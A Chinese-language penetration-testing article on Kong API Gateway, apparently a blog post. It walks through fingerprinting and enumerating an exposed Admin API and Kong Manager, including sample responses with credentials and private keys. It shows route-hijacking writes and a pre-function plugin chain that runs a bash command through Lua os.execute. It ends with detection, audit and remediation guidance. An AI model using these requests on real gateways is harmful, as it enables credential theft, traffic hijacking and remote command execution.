---
title: "Kong API网关管理面打点与Admin API利用技术"
date: 2026-06-16T09:52:48+08:00
draft: false
weight: 69
description: "围绕Kong API网关相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "API网关", "Kong", "Admin API"]
---

# Kong API网关管理面打点与Admin API利用技术

`Kong Gateway` 是典型的 API 网关控制平面。它的风险不只是“有一个反向代理节点”，而在于它同时汇聚了：

- 上游服务 `service`
- 暴露规则 `route`
- 请求处理链 `plugin`
- 消费者 `consumer` 与认证凭据
- 证书、SNI、CA、TLS 路由
- upstream、target、健康检查与负载均衡
- 企业版里的 workspace、RBAC、audit log 与 Kong Manager

对攻击者来说，Kong 的价值在于它天然位于业务入口与服务治理中心。一旦管理面暴露，往往可以一次性回收：

- 内部微服务地址、协议、端口与路径
- 对外 API 域名、路径前缀、TLS SNI 与路由规则
- 当前启用的鉴权、限流、改写、日志与 serverless 插件
- 消费者账号与 API Key/JWT/OAuth 凭据边界
- upstream 真实节点和健康检查方式
- 若干企业环境中的管理员、工作区与审计轨迹

更关键的是，Kong 的管理面并不只是“查看配置”，它本身就是配置下发中心。只要拿到足够的 `Admin API` 权限，攻击者就可以继续转向：

- 新增或篡改路由，把网关流量导向攻击者控制的上游
- 挂载认证旁路或 serverless 类插件
- 新建消费者和认证凭据
- 改写证书、SNI、上游与目标节点
- 通过公开利用链把“管理面接管”继续放大为代码执行或流量劫持

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Kong 管理面或 Kong Manager
2. 如何围绕 `Admin API` 的 service、route、plugin、consumer、upstream 建立配置画像
3. 如何从企业版 RBAC、workspace、audit log 判断管理边界
4. 哪些请求与响应最值得完整留档
5. 蓝队如何从访问日志、审计日志与配置变更轨迹识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与路径

Kong 默认最值得打点的端口组合通常包括：

- `8000/tcp` 代理流量 HTTP
- `8443/tcp` 代理流量 HTTPS
- `8001/tcp` Admin API HTTP
- `8444/tcp` Admin API HTTPS
- `8002/tcp` Kong Manager HTTP
- `8445/tcp` Kong Manager HTTPS

常见路径包括：

- `/`
- `/status`
- `/services`
- `/routes`
- `/plugins`
- `/plugins/enabled`
- `/schemas/plugins/{name}`
- `/consumers`
- `/certificates`
- `/snis`
- `/upstreams`
- `/upstreams/{name}/targets`
- `/ca_certificates`
- `/vaults`
- `/workspaces`
- `/rbac/users`
- `/admins`
- `/audit/requests`
- `/audit/objects`

### 0.2 官方默认边界

Kong 官方安全文档明确强调：

- `Admin API` 默认只监听本地接口 `127.0.0.1:8001`
- 如果把 `admin_listen` 改成 `0.0.0.0:8001` 或其它对外地址，整套 Kong 集群的安全性会直接受影响

Kong Manager 官方文档还明确说明：

- `Kong Manager` 默认启动时不启用认证
- 默认假设同主机上的 `Admin API` 可在 `8001` 访问

这意味着实战里必须区分三种暴露面：

1. 只暴露代理面 `8000/8443`
2. 错误暴露 `Admin API`
3. 错误暴露 `Kong Manager`，且它又能直连后台 `Admin API`

### 0.3 打点收益优先级

按“最快转成真实攻击价值”的顺序，Kong 的打点收益通常可排为：

1. 确认是否为 Kong，判断暴露的是代理面、Admin API 还是 Manager
2. 获取 `service`、`route`、`plugin` 基础画像，回收对外入口和内部上游
3. 获取 `consumer` 与认证插件配置，判断鉴权边界
4. 获取 `upstream`、`target`、`certificate`、`sni`，回收真实基础设施信息
5. 判断是否具备写权限，可否继续通过公开利用链完成流量劫持或插件执行

---

## 1. 第一轮打点：确认是否为 Kong

### 1.1 `GET /` 识别 Admin API

公开利用模块与大量 PoC 都会先用根路径判断是否为 Kong Admin API，因为默认响应很稳定。

#### 请求示例

```http
GET / HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "tagline": "Welcome to kong"
}
```

如果根路径返回这个结果，基本可直接判断：

- 目标是 Kong Admin API
- 当前不是普通业务 API
- 后续可继续测试 `/services`、`/routes`、`/plugins`

### 1.2 `GET /status`

某些环境还会暴露状态接口。

#### 请求示例

```http
GET /status HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "database": {
    "reachable": true
  },
  "server": {
    "connections_accepted": 124912,
    "connections_active": 37,
    "connections_handled": 124912,
    "connections_reading": 0,
    "connections_writing": 2,
    "connections_waiting": 35,
    "total_requests": 1822331
  }
}
```

这一步的价值在于：

- 判断数据库是否联通
- 判断节点当前连接与请求体量
- 确认这是可工作的控制节点而不是孤立页面

### 1.3 Kong Manager 页面识别

官方文档说明 `Kong Manager` 默认无认证启动，因此一旦暴露到外网，首页本身就值得重点留档。

#### 请求示例

```http
GET / HTTP/1.1
Host: kong-manager.target.example:8002
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

```html
<!doctype html>
<html>
  <head>
    <title>Kong Manager</title>
  </head>
</html>
```

页面或前端资源中常见特征包括：

- `Kong Manager`
- `/auth`
- `workspaces`
- `services`
- `routes`
- `consumers`

### 1.4 端口组合判断

Kong 环境里常见的错误部署方式是：

- `8000` 对公网开放，属于正常代理面
- `8001` 也对公网开放，属于严重管理面暴露
- `8002` 额外开放，形成 Manager 到 Admin API 的完整前后台控制链

因此在首轮扫描阶段，应重点记录：

- `8001/8444` 是否直连
- `8002/8445` 是否可打开页面
- Manager 前端接口是否在浏览器里继续请求同主机 `8001`

---

## 2. 第二轮打点：Services、Routes 与 Plugins

### 2.1 `GET /services`

`service` 是 Kong 配置画像的第一核心对象，因为它直接对应真实上游。

#### 请求示例

```http
GET /services HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "id": "6f3dd5cb-8c9a-4d8e-8cc1-f39a6fef3f73",
      "name": "billing-service",
      "host": "billing.internal.svc.cluster.local",
      "port": 8443,
      "protocol": "https",
      "path": "/api",
      "connect_timeout": 60000,
      "read_timeout": 60000,
      "write_timeout": 60000,
      "retries": 5
    }
  ],
  "next": null
}
```

这类响应会直接暴露：

- 内部上游域名
- 协议和端口
- 上游路径
- 超时和重试策略

### 2.2 `GET /routes`

`route` 直接对应对外暴露规则，是网关专题里最有价值的对象之一。

#### 请求示例

```http
GET /routes HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "id": "8d8ad9f4-fb62-402f-bfe6-8e45bfbec734",
      "name": "billing-public-route",
      "paths": [
        "/billing"
      ],
      "hosts": [
        "api.target.example"
      ],
      "methods": [
        "GET",
        "POST"
      ],
      "protocols": [
        "http",
        "https"
      ],
      "strip_path": true,
      "service": {
        "id": "6f3dd5cb-8c9a-4d8e-8cc1-f39a6fef3f73"
      }
    }
  ],
  "next": null
}
```

通过 `route` 可以快速回收：

- 对外 API 域名
- 路径前缀与方法
- HTTP/HTTPS/TLS 协议配置
- route 到 service 的映射关系

### 2.3 `GET /plugins`

插件链是 Kong 风险判断的真正核心。很多安全能力和很多事故，也都发生在插件层。

#### 请求示例

```http
GET /plugins HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "id": "d74dc5f1-8802-4a17-94e8-b5ad0f1f1f86",
      "name": "key-auth",
      "enabled": true,
      "service": {
        "id": "6f3dd5cb-8c9a-4d8e-8cc1-f39a6fef3f73"
      },
      "route": {
        "id": "8d8ad9f4-fb62-402f-bfe6-8e45bfbec734"
      },
      "config": {
        "key_names": [
          "apikey"
        ],
        "hide_credentials": false
      }
    }
  ],
  "next": null
}
```

这一步的价值包括：

- 判断是否用了 `key-auth`、`jwt`、`oauth2`、`acl`、`rate-limiting`
- 判断鉴权是挂在 service 还是 route
- 判断是否使用高风险 serverless 类插件

### 2.4 `GET /plugins/enabled`

#### 请求示例

```http
GET /plugins/enabled HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "enabled_plugins": [
    "bundled",
    "key-auth",
    "jwt",
    "acl",
    "rate-limiting",
    "request-transformer",
    "pre-function"
  ]
}
```

如果这里出现：

- `pre-function`
- `post-function`
- `request-transformer-advanced`
- 自定义日志或外发类插件

就应提高优先级，因为它们经常意味着更强的配置影响面。

### 2.5 `GET /schemas/plugins/{name}`

#### 请求示例

```http
GET /schemas/plugins/key-auth HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "name": "key-auth",
  "fields": [
    {
      "config": {
        "fields": [
          {
            "key_names": {
              "type": "array"
            }
          }
        ]
      }
    }
  ]
}
```

这一步更偏技术研判，主要用于：

- 判断插件实际可配置字段
- 评估哪些字段能影响认证、转发、日志或请求改写

---

## 3. 第三轮打点：Consumers、Credentials 与认证边界

### 3.1 `GET /consumers`

#### 请求示例

```http
GET /consumers HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "id": "8f5acdb8-5433-43c8-bf2d-1822e1f5f3ae",
      "username": "mobile-app",
      "custom_id": "consumer-mobile-app",
      "tags": [
        "prod"
      ]
    },
    {
      "id": "c404ea8b-9fe8-4dd8-8f97-c0189878fef4",
      "username": "partner-gateway"
    }
  ],
  "next": null
}
```

这类数据常常能直接回收：

- 调用方命名
- 外部合作接口身份
- 生产环境标签
- 与 route / plugin 的认证关系

### 3.2 `GET /consumers/{consumer}/key-auth`

如果启用了 `key-auth`，继续判断凭据面是否可读。

#### 请求示例

```http
GET /consumers/mobile-app/key-auth HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "id": "7a0b16b0-7f11-4b50-8b57-f0dc2580e4c9",
      "key": "mbl-prod-4f9fd8b8f7a74a3e"
    }
  ],
  "next": null
}
```

一旦这类接口可读，风险会从“配置情报回收”上升到：

- 直接持有调用方凭据
- 模拟合法消费者
- 进一步访问被网关保护的下游业务

### 3.3 `GET /consumers/{consumer}/jwt`

#### 请求示例

```http
GET /consumers/partner-gateway/jwt HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "id": "d2a9d3cc-f774-4e78-9d61-c4bb237708d7",
      "key": "partner-kid",
      "algorithm": "HS256",
      "secret": "c3VwZXJzZWNyZXQxMjM="
    }
  ],
  "next": null
}
```

这类回显特别危险，因为它可能直接暴露：

- JWT 签名密钥
- 认证算法
- 下游身份伪造条件

### 3.4 未授权访问的典型反馈

如果环境启用了 RBAC 或前置认证，Admin API 往往不会直接吐出数据。

#### 请求示例

```http
GET /services HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "message": "Unauthorized"
}
```

这同样值得留档，因为它能说明：

- 路径确实存在
- 只是当前缺失后台认证
- 后续应转到 Manager 会话、错误反代、RBAC 或配置泄露方向

---

## 4. 第四轮打点：Upstream、Targets、Certificates 与网关基础设施

### 4.1 `GET /upstreams`

#### 请求示例

```http
GET /upstreams HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "id": "349e6233-4231-4d3c-a6ad-f00e6f6c163f",
      "name": "billing-upstream",
      "algorithm": "round-robin",
      "hash_on": "none",
      "slots": 10000,
      "healthchecks": {
        "active": {
          "http_path": "/healthz"
        }
      }
    }
  ],
  "next": null
}
```

这一步会暴露：

- 上游池命名
- 负载均衡算法
- 健康检查路径
- 一些原本不该对外暴露的运维端点

### 4.2 `GET /upstreams/{name}/targets`

#### 请求示例

```http
GET /upstreams/billing-upstream/targets HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "id": "5dcb3baa-f66f-4991-96a8-5fc2977b5f04",
      "target": "10.20.41.31:8443",
      "weight": 100
    },
    {
      "id": "d9fb41d4-4df6-46d6-a97e-faa6478a3ce8",
      "target": "10.20.41.32:8443",
      "weight": 100
    }
  ],
  "next": null
}
```

这一层是极高价值基础设施情报，因为它会直接暴露：

- 真实后端节点 IP
- 服务实例规模
- 流量权重

### 4.3 `GET /certificates`

#### 请求示例

```http
GET /certificates HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "id": "267ad9a2-cb7f-4f89-9fc4-79bc180485a5",
      "cert": "-----BEGIN CERTIFICATE-----\nMIIDBjCCAe4CCQC0...\n-----END CERTIFICATE-----",
      "key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkq...\n-----END PRIVATE KEY-----",
      "tags": [
        "edge"
      ]
    }
  ],
  "next": null
}
```

如果这里可读到私钥，风险已经非常严重，因为它可能意味着：

- TLS 终止链完全失守
- 网关与相关域名的证书私钥泄露

### 4.4 `GET /snis`

#### 请求示例

```http
GET /snis HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "id": "327447f4-aec7-4d57-9ce5-3325df1186d4",
      "name": "api.target.example",
      "certificate": {
        "id": "267ad9a2-cb7f-4f89-9fc4-79bc180485a5"
      }
    }
  ],
  "next": null
}
```

SNI 数据可帮助快速建立：

- 域名到证书的绑定关系
- TLS 路由命名
- 业务入口域名清单

---

## 5. 第五轮打点：企业版管理边界、写操作与历史利用链

### 5.1 `GET /workspaces`

企业版环境中，`workspace` 是配置隔离和多租户的重要边界。

#### 请求示例

```http
GET /workspaces HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "id": "1065b6d6-219f-4002-b3e9-334fc3eff46c",
      "name": "default"
    },
    {
      "id": "22544ca5-f4c9-4e24-bc90-9df4725e0705",
      "name": "partner-prod"
    }
  ],
  "next": null
}
```

这一步适合判断：

- 是否是企业版
- 配置是否按业务线或租户隔离

### 5.2 `GET /rbac/users`

#### 请求示例

```http
GET /rbac/users HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "id": "7df3a20c-c58a-41e6-b837-e35a93d3096f",
      "name": "platform-admin",
      "enabled": true,
      "user_token_ident": "6ef90de2-8ef0-4f74-9d43-0e5bbf4e7f5d"
    }
  ],
  "next": null
}
```

RBAC 用户信息能帮助判断：

- 管理员命名
- 当前是否启用了 RBAC
- 管理面是否仍处于“谁能进来谁就能改”的状态

### 5.3 `GET /audit/requests` 与 `GET /audit/objects`

官方审计文档说明：

- 审计日志默认关闭
- 开启后可通过 `Admin API` 读取 `HTTP request` 与 `database changes`

#### 请求示例

```http
GET /audit/requests HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "client_ip": "10.20.10.21",
      "method": "GET",
      "path": "/services",
      "rbac_user_name": "platform-admin",
      "request_id": "OjOcUBvt6q6XJlX3dd6BSpy1uUkTyctC",
      "request_source": "kong-manager",
      "request_timestamp": 1781585122,
      "status": 200,
      "workspace": "1065b6d6-219f-4002-b3e9-334fc3eff46c"
    }
  ],
  "total": 1
}
```

#### 请求示例

```http
GET /audit/objects HTTP/1.1
Host: kong-admin.target.example:8001
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "dao_name": "consumers",
      "entity": "{\"id\":\"16787ed7-d805-434a-9cec-5e5a3e5c9e4f\",\"username\":\"bob\"}",
      "entity_key": "16787ed7-d805-434a-9cec-5e5a3e5c9e4f",
      "operation": "create",
      "request_id": "59fpTWlpUtHJ0qnAWBzQRHRDv7i5DwK2"
    }
  ],
  "total": 1
}
```

这两类接口是蓝队回溯和红队评估“是否已有人改过配置”的关键线索。

### 5.4 Manager 与 RBAC 的错误组合

官方 Manager 网络配置文档明确提示：

- `Kong Manager` 默认无认证
- 即便启用了 `Kong Manager` 认证，如果没有同时打开 `enforce_rbac=on`，只要能登录 Manager 的人就能执行所有 `Admin API` 操作

这类错误配置的实战价值非常高，因为它意味着：

- 风险不一定来自真正的后台未授权
- 也可能来自一个低门槛的 Manager 登录入口

### 5.5 写操作：创建 Service 与 Route

拿到可写 `Admin API` 后，最值得先验证的是能否创建新路由。

#### 请求示例

```http
POST /services HTTP/1.1
Host: kong-admin.target.example:8001
Content-Type: application/json
Connection: close

{
  "name": "debug-upstream",
  "url": "http://10.20.99.50:8080"
}
```

#### 典型响应示例

```json
{
  "id": "3b2b8019-f4a2-4f2e-96bd-1c4cd72ef17f",
  "name": "debug-upstream",
  "host": "10.20.99.50",
  "port": 8080,
  "protocol": "http",
  "path": null
}
```

#### 请求示例

```http
POST /routes HTTP/1.1
Host: kong-admin.target.example:8001
Content-Type: application/json
Connection: close

{
  "name": "debug-route",
  "paths": [
    "/debug-kong"
  ],
  "service": {
    "id": "3b2b8019-f4a2-4f2e-96bd-1c4cd72ef17f"
  }
}
```

#### 典型响应示例

```json
{
  "id": "73f6d552-4497-4f07-b14b-72cf9cf65229",
  "name": "debug-route",
  "paths": [
    "/debug-kong"
  ]
}
```

这类写操作一旦成功，说明攻击面已从“打点”直接升级为：

- 流量导流
- 反代任意上游
- 暴露内部服务

### 5.6 公开利用链：暴露 Admin API 后挂载 `pre-function`

Metasploit 曾公开收录 `kong_gateway_admin_api_rce` 模块。该利用链本质不是“未授权 0day”，而是：

1. 先控制或访问到暴露的 `Admin API`
2. 通过 `POST /routes` 创建一个新路由
3. 在该 route 下挂载 `pre-function` 插件
4. 使用 Lua `os.execute()` 执行系统命令
5. 通过代理面触发该 route

#### 请求示例

```http
POST /routes HTTP/1.1
Host: kong-admin.target.example:8001
Content-Type: application/x-www-form-urlencoded
Connection: close

name=diag-2fd9fbb0&paths=/diag-2fd9fbb0
```

#### 典型响应示例

```http
HTTP/1.1 201 Created
```

#### 请求示例

```http
POST /routes/diag-2fd9fbb0/plugins HTTP/1.1
Host: kong-admin.target.example:8001
Content-Type: application/x-www-form-urlencoded
Connection: close

name=pre-function&config.access=os.execute([[bash -c "id > /tmp/kong_diag" &]])
```

#### 典型响应示例

```http
HTTP/1.1 201 Created
```

#### 触发请求示例

```http
GET /diag-2fd9fbb0 HTTP/1.1
Host: api.target.example:8000
Connection: close
```

#### 典型触发结果示例

```http
HTTP/1.1 503 Service Unavailable
```

即使这里返回 `503`，命令也可能已经在 Kong 节点上执行。这个链条说明：

- Kong 最危险的不是“页面能打开”
- 而是“暴露的 Admin API 可以创建配置并挂载可执行逻辑”

### 5.7 历史授权绕过风险：JWT 插件路径混淆链

社区公开研究中还出现过 Kong 旧版本在 `JWT` 插件场景下可通过路径混淆访问本应受保护 route 的问题。其核心意义不在具体 PoC，而在于提醒：

- Kong 的风险不只在后台管理面
- 路由匹配、插件挂载范围和上游路径归一化同样会影响认证边界

在渗透测试中，如果看到：

- 同一 service 下同时存在受保护和未保护 route
- 使用 `jwt` 等鉴权插件
- 上游服务自身又存在路径归一化差异

就应把这类“网关鉴权与应用路径解析不一致”的链条纳入重点验证。

---

## 6. 蓝队日志、审计与处置

### 6.1 Admin API 访问日志

Kong 基于 Nginx/OpenResty，请求打点通常会首先落在 HTTP 访问日志中。应重点关注：

- `/`
- `/status`
- `/services`
- `/routes`
- `/plugins`
- `/plugins/enabled`
- `/schemas/plugins/`
- `/consumers`
- `/upstreams`
- `/targets`
- `/certificates`
- `/snis`
- `/workspaces`
- `/rbac/users`
- `/audit/requests`
- `/audit/objects`

#### 日志示例

```text
203.0.113.25 - - [16/Jun/2026:22:31:09 +0800] "GET / HTTP/1.1" 200 31 "-" "python-requests/2.32.3"
```

#### 日志示例

```text
203.0.113.25 - - [16/Jun/2026:22:31:16 +0800] "GET /services HTTP/1.1" 200 1821 "-" "python-requests/2.32.3"
```

#### 日志示例

```text
203.0.113.25 - - [16/Jun/2026:22:31:28 +0800] "POST /routes/diag-2fd9fbb0/plugins HTTP/1.1" 201 514 "-" "python-requests/2.32.3"
```

如果同一来源连续完成：

- `GET /`
- `GET /services`
- `GET /routes`
- `GET /plugins`
- `GET /consumers`
- `POST /services` / `POST /routes`

则几乎可判定为结构化 Kong 管理面打点或接管。

### 6.2 Kong Manager 与审计日志

官方审计文档说明：

- 可记录 `Admin API` HTTP 请求
- 可记录数据库对象创建、更新、删除
- `request_source = kong-manager` 可标识行为来自 Manager

#### 审计日志示例

```json
{
  "client_ip": "203.0.113.25",
  "method": "GET",
  "path": "/auth",
  "request_source": "kong-manager",
  "status": 200,
  "rbac_user_name": "platform-admin"
}
```

#### 审计日志示例

```json
{
  "dao_name": "routes",
  "operation": "create",
  "entity_key": "73f6d552-4497-4f07-b14b-72cf9cf65229",
  "request_id": "59fpTWlpUtHJ0qnAWBzQRHRDv7i5DwK2"
}
```

蓝队排查时应重点看：

- 是否有异常来源登录 `Kong Manager`
- 是否有新建 `service`、`route`、`plugin`、`consumer`
- 是否有人读取过证书、RBAC、workspace、audit 接口

### 6.3 配置与行为侧迹象

即使没有开启企业审计日志，仍可从行为上发现问题：

- 新出现的 route 路径
- 非预期上游被新增到 `upstream target`
- `pre-function` / `post-function` / `request-transformer` 等插件突然出现
- 某个业务入口开始转发到未知 IP
- TLS 证书和 SNI 绑定发生异常变化

### 6.4 处置建议

发现 Kong 管理面被打点或已失守后，应优先做：

1. 立即收敛 `8001/8444/8002/8445` 的暴露面，仅允许受控管理网段访问
2. 检查 `admin_listen` 是否错误绑定到公网或广域私网
3. 核查 `Kong Manager` 是否默认无认证启动，是否启用了 `enforce_rbac=on`
4. 检查近期 `service`、`route`、`plugin`、`consumer`、`certificate`、`upstream target` 变更
5. 核查是否存在 `pre-function`、`post-function`、可执行或外发类插件
6. 如果企业版启用了 `audit_log`，立即导出 `/audit/requests` 与 `/audit/objects` 回溯时间线

长期建议：

- 不把 `Admin API` 直接暴露到公网
- 优先使用本地监听或最小网段开放
- `Kong Manager` 开启认证时同步启用 `RBAC`
- 对 `Admin API` 和 `Manager` 建立独立访问日志与告警
- 对新建 route、plugin、consumer、certificate 建立基线审计

---

## 7. 复盘清单

### 7.1 红队侧

- 是否确认了暴露的是代理面、Admin API 还是 Manager
- 是否完整记录了 `services`、`routes`、`plugins`、`consumers`、`upstreams` 请求与响应
- 是否判断了是否存在可直接读取凭据或证书的接口
- 是否验证了 `workspace`、`rbac`、`audit` 等企业版管理边界
- 是否核查了暴露 Admin API 后的 `pre-function` 公开利用链条件

### 7.2 蓝队侧

- 是否能识别从 `/ -> /services -> /routes -> /plugins -> /consumers` 的连续访问链
- 是否能识别异常 `Kong Manager` 登录和来源 IP
- 是否能识别对 `service`、`route`、`plugin`、`certificate`、`target` 的创建或修改
- 是否能发现高风险插件或未知上游节点的突然出现

### 7.3 应急侧

- 是否确认是否已有新 route、plugin 或 consumer 被植入
- 是否确认是否已有证书、认证凭据或上游节点信息被导出
- 是否完成了 `Admin API` / `Manager` 暴露面的收敛
- 是否完成了 RBAC、审计与高风险插件基线的复核

---

## 8. 总结

`Kong Gateway` 的真正风险，不只是“一个 API 网关后台能不能访问”，而在于它把：

- 对外入口
- 内部上游
- 鉴权插件
- 消费者凭据
- TLS 与证书
- 负载均衡目标
- 企业版管理和审计能力

统一汇聚到同一套 `Admin API` 与 `Kong Manager` 控制平面。

对打点来说，更值得沉淀的方法学是：

- 先确认 `Admin API` 与 `Manager` 的真实暴露边界
- 再建立 `service/route/plugin/consumer` 的配置画像
- 再回收 `upstream/target/certificate/sni` 的基础设施关系
- 最后验证 RBAC、审计、写操作边界以及暴露管理面后的公开利用链

只有把这些对象串成链，才能把“一个 Kong 后台暴露了”真正转化为结构化攻击价值判断。

---

## 参考资料

- [Kong Gateway Admin API](https://docs.konghq.com/gateway/latest/admin-api/)
- [Secure the Admin API](https://developer.konghq.com/gateway/secure-the-admin-api/)
- [Networking Configuration for Kong Manager](https://docs.konghq.com/gateway/latest/kong-manager/networking/)
- [Gateway Services](https://developer.konghq.com/gateway/entities/service/)
- [Routes](https://developer.konghq.com/gateway/entities/route/)
- [Upstreams](https://docs.konghq.com/gateway/latest/key-concepts/upstreams/)
- [Kong Gateway audit logs](https://developer.konghq.com/gateway/audit-logs/)
- [Metasploit kong_gateway_admin_api_rce](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/kong_gateway_admin_api_rce.rb)
